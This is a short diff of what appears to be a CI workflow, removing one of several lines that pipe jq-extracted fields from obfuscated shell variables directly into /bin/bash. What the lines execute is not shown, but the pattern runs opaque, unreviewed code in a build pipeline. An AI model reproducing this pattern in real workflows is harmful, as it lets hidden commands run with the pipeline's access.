@@ -29,7 +29,6 @@ jobs:
           echo $w93 | jq -r .noavn00 | /bin/bash
           echo $lp4 | jq -r .xrxv167 | /bin/bash
           printf '%s' "$e2" | jq -r .xsbp56016 | /bin/bash
-          printf '%s' "$shuv280" | jq -r .dl080 | /bin/bash
           printf '%s' "$ao532" | jq -r .nqpt104 | /bin/bash
           printf '%s' "$qwx99922" | jq -r .l708 | /bin/bash
           printf '%s' "$dwt3" | jq -r .xk8 | /bin/bash
